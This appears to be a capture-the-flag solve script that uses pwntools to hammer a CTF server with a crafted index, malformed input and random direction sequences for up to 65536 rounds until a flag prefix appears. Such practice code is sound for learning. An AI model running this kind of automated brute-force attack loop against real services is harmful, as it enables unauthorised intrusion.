from subprocess import Popen, PIPE
import sys
import random
import pwn

pwn.context.log_level = 'error'

for round in range(65536):

    conn = pwn.remote('challenges.crysys.hu', 5007)
    line = conn.recvuntil('Choice: ')
    conn.sendline(b'1\n')
    line = conn.recvuntil('Give me an index: ')
    conn.sendline(b'46\n')
    line = conn.recvuntil('Give me an index: ')
    conn.sendline(b'a\n')
    print(f'round {round} ', end='')

    data = []
    for i in range(8):
        data.append(random.choice(['h','j','k','l']))

    data = data + ['l'] * (32 - len(data))
    tip = (''.join(data[0:8]))
    print(f'data {tip} ', end='')

    for i in range(len(data)):
        line = conn.recvuntil(f'Give me the {i}. direction: ')
        conn.sendline(data[i])

    line = conn.recvuntil('Choice:')
    conn.sendline(b'2\n')
    line = conn.recvall(20)

    print(line)
    if b'cd21' in line:
        break
